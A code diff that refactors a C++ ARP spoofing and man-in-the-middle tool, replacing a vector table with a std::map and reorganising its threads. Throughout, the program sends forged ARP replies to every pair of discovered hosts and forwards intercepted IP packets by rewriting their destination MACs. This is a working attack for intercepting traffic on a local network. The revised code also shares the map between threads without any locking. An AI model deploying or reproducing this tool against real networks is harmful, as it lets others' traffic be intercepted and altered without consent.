@@ -4,8 +4,7 @@
 // #define INFO 1
 
 // Function to handle receiving ARP responses
-void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, uint32_t gateway_ip, struct sockaddr_ll &device) {
-    int i;
+void receive_responses(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, uint32_t gateway_ip, struct sockaddr_ll &device) {
     uint8_t buffer[IP_MAXPACKET];
     struct sockaddr saddr;
     int saddr_len = sizeof(saddr);
@@ -15,16 +14,8 @@ void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
     printf("IP\t\t\tMAC\n");
     printf("-----------------------------------------\n");
 
-    // auto start_time = std::chrono::steady_clock::now();
-
     uint32_t src_ip = 0;
     while (true) {
-        // Check if 3 seconds have passed
-        // auto current_time = std::chrono::steady_clock::now();
-        // if (std::chrono::duration_cast<std::chrono::seconds>(current_time - start_time).count() >= 3) {
-        //     break;
-        // }
-
         // Receive packet
         int bytes = recvfrom(sd, buffer, IP_MAXPACKET, 0, &saddr, (socklen_t *)&saddr_len);
         if (bytes < 0) {
@@ -39,7 +30,7 @@ void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
             // Check if ARP packet is a response
             if (ntohs(arphdr->opcode) == ARPOP_REPLY) {
                 // Save IP-MAC pair
-                ip_mac_pairs.push_back({arphdr->sender_ip, arphdr->sender_mac});
+                ip_mac_pairs[arphdr->sender_ip] = arphdr->sender_mac;
 
                 // If the IP address is the gateway IP, continue
                 if (arphdr->sender_ip[0] == (gateway_ip & 0xff) && arphdr->sender_ip[1] == ((gateway_ip >> 8) & 0xff) && arphdr->sender_ip[2] == ((gateway_ip >> 16) & 0xff) && arphdr->sender_ip[3] == ((gateway_ip >> 24) & 0xff)) {
@@ -49,7 +40,7 @@ void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
                 // Print source IP address
                 printf("%d.%d.%d.%d\t\t", arphdr->sender_ip[0], arphdr->sender_ip[1], arphdr->sender_ip[2], arphdr->sender_ip[3]);
                 // Print source MAC address
-                for (i = 0; i < 5; i++) {
+                for (int i = 0; i < 5; i++) {
                     printf("%02x:", arphdr->sender_mac[i]);
                 }
                 printf("%02x\n", arphdr->sender_mac[5]);
@@ -73,22 +64,14 @@ void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
             std::array<uint8_t, 4> ip_addr;
             memcpy(ip_addr.data(), &iph->saddr, 4);
 
-            // Find the MAC address for the source IP
-            auto it = std::find_if(ip_mac_pairs.begin(), ip_mac_pairs.end(), [ip_addr](const auto &pair) {
-                return pair.first == ip_addr;
-            });
-
             // If the source IP is src_ip, change the destination MAC to the gateway's MAC
             if (iph->saddr == src_ip) {
                 // Find the MAC address for the gateway IP
                 std::array<uint8_t, 4> gateway_ip_addr;
                 memcpy(gateway_ip_addr.data(), &gateway_ip, 4);
-                auto it_gateway = std::find_if(ip_mac_pairs.begin(), ip_mac_pairs.end(), [gateway_ip_addr](const auto &pair) {
-                    return pair.first == gateway_ip_addr;
-                });
-                if (it_gateway != ip_mac_pairs.end()) {
-                    memcpy(eth->h_dest, it_gateway->second.data(), ETH_ALEN);
-                }
+                std::array<uint8_t, 6> &gateway_mac = ip_mac_pairs[gateway_ip_addr];
+                memcpy(eth->h_dest, gateway_mac.data(), ETH_ALEN);
+
                 // Send the modified packet
                 if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) == -1) {
                     perror("sendto() failed");
@@ -100,12 +83,8 @@ void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
                 // Find the MAC address for the destination IP
                 std::array<uint8_t, 4> dest_ip_addr;
                 memcpy(dest_ip_addr.data(), &iph->daddr, 4);
-                auto it_dest = std::find_if(ip_mac_pairs.begin(), ip_mac_pairs.end(), [dest_ip_addr](const auto &pair) {
-                    return pair.first == dest_ip_addr;
-                });
-                if (it_dest != ip_mac_pairs.end()) {
-                    memcpy(eth->h_dest, it_dest->second.data(), ETH_ALEN);
-                }
+                std::array<uint8_t, 6> &dest_mac = ip_mac_pairs[dest_ip_addr];
+                memcpy(eth->h_dest, dest_mac.data(), ETH_ALEN);
 
                 // Send the modified packet
                 if (sendto(sd, buffer, bytes, 0, (struct sockaddr *)&device, sizeof(device)) == -1) {
@@ -136,41 +115,35 @@ void receive_arp_responses(int sd, std::vector<std::pair<std::array<uint8_t, 4>,
         }
         memset(buffer, 0, IP_MAXPACKET);
     }
-    printf("-----------------------------------------\n");
 }
 
 // Function to send fake ARP replies
-void send_fake_arp_replies(int sd, std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, struct sockaddr_ll &device) {
+void send_fake_arp_replies(int sd, std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> &ip_mac_pairs, std::array<uint8_t, 6> my_mac, struct sockaddr_ll &device) {
     arp_hdr arphdr;
-    arphdr.htype = htons(1);             // Hardware type (16 bits): 1 for ethernet
-    arphdr.ptype = htons(ETH_P_IP);      // Protocol type (16 bits): 2048 for IP
-    arphdr.hlen = 6;                     // Hardware address length (8 bits): 6 bytes for MAC address
-    arphdr.plen = 4;                     // Protocol address length (8 bits): 4 bytes for IPv4 address
-    arphdr.opcode = htons(ARPOP_REPLY);  // OpCode: 2 for ARP reply
+    arphdr.htype = htons(1);                    // Hardware type (16 bits): 1 for ethernet
+    arphdr.ptype = htons(ETH_P_IP);             // Protocol type (16 bits): 2048 for IP
+    arphdr.hlen = 6;                            // Hardware address length (8 bits): 6 bytes for MAC address
+    arphdr.plen = 4;                            // Protocol address length (8 bits): 4 bytes for IPv4 address
+    arphdr.opcode = htons(ARPOP_REPLY);         // OpCode: 2 for ARP reply
+    int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
     std::array<uint8_t, IP_MAXPACKET> ether_frame;
 
+    ether_frame[12] = ETH_P_ARP / 256;
+    ether_frame[13] = ETH_P_ARP % 256;
     while (true) {
-        for (size_t i = 0; i < ip_mac_pairs.size(); ++i) {
-            for (size_t j = 0; j < ip_mac_pairs.size(); ++j) {
-                if (i == j) continue;  // Skip sending to self
+        for (auto it_i = ip_mac_pairs.begin(); it_i != ip_mac_pairs.end(); ++it_i) {
+            for (auto it_j = ip_mac_pairs.begin(); it_j != ip_mac_pairs.end(); ++it_j) {
+                if (it_i == it_j) continue;  // Skip sending to self
 
                 // Construct and send fake ARP reply
-                std::copy(my_mac.begin(), my_mac.end(), arphdr.sender_mac.begin());                                  // Sender hardware address (48 bits): MAC address
-                std::copy(ip_mac_pairs[j].first.begin(), ip_mac_pairs[j].first.end(), arphdr.sender_ip.begin());     // Sender protocol address (32 bits): IP of another pair
-                std::copy(ip_mac_pairs[i].second.begin(), ip_mac_pairs[i].second.end(), arphdr.target_mac.begin());  // Target hardware address (48 bits): MAC address of current pair
-                std::copy(ip_mac_pairs[i].first.begin(), ip_mac_pairs[i].first.end(), arphdr.target_ip.begin());     // Target protocol address (32 bits): IP of current pair
-
-                // Fill out ethernet frame header.
-                int frame_length = 6 + 6 + 2 + ARP_HDRLEN;  // Ethernet frame length = ethernet header (MAC + MAC + ethernet type) + ethernet data (ARP header)
+                std::copy(my_mac.begin(), my_mac.end(), arphdr.sender_mac.begin());              // Sender hardware address (48 bits): MAC address
+                std::copy(it_j->first.begin(), it_j->first.end(), arphdr.sender_ip.begin());     // Sender protocol address (32 bits): IP of another pair
+                std::copy(it_i->second.begin(), it_i->second.end(), arphdr.target_mac.begin());  // Target hardware address (48 bits): MAC address of current pair
+                std::copy(it_i->first.begin(), it_i->first.end(), arphdr.target_ip.begin());     // Target protocol address (32 bits): IP of current pair
 
                 // Destination and Source MAC addresses
-                std::copy(ip_mac_pairs[i].second.begin(), ip_mac_pairs[i].second.end(), ether_frame.begin());
+                std::copy(it_i->second.begin(), it_i->second.end(), ether_frame.begin());
                 std::copy(my_mac.begin(), my_mac.end(), ether_frame.begin() + 6);
-
-                // Ethernet type code (ETH_P_ARP for ARP).
-                // http://www.iana.org/assignments/ethernet-numbers
-                ether_frame[12] = ETH_P_ARP / 256;
-                ether_frame[13] = ETH_P_ARP % 256;
 
                 // ARP header
                 memcpy(ether_frame.data() + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));
@@ -200,7 +173,7 @@ int main(int argc, char **argv) {
     char *interface;
     struct ifreq ifr;
     struct sockaddr_ll device;
-    int i, frame_length, sd, bytes;
+    int frame_length, sd, bytes;
     arp_hdr arphdr;
     struct sockaddr_in src_ip;
     struct sockaddr_in netmask;
@@ -296,14 +269,14 @@ int main(int argc, char **argv) {
     }
 
     // Use a table to save IP-MAC pairs
-    std::vector<std::pair<std::array<uint8_t, 4>, std::array<uint8_t, 6>>> ip_mac_pairs;
-
-    // Start the threads
-    std::thread receive_thread(receive_arp_responses, sd, std::ref(ip_mac_pairs), src_mac, gateway_ip, std::ref(device));
+    std::map<std::array<uint8_t, 4>, std::array<uint8_t, 6>> ip_mac_pairs;
+    // Start the thread
     std::thread send_thread(send_fake_arp_replies, sd, std::ref(ip_mac_pairs), src_mac, std::ref(device));
 
-    // Wait for the threads to finish
-    receive_thread.join();
+    // Receive ARP responses
+    receive_responses(sd, ip_mac_pairs, src_mac, gateway_ip, device);
+
+    // Wait for the thread to finish
     send_thread.join();
 
     // Close socket descriptor.
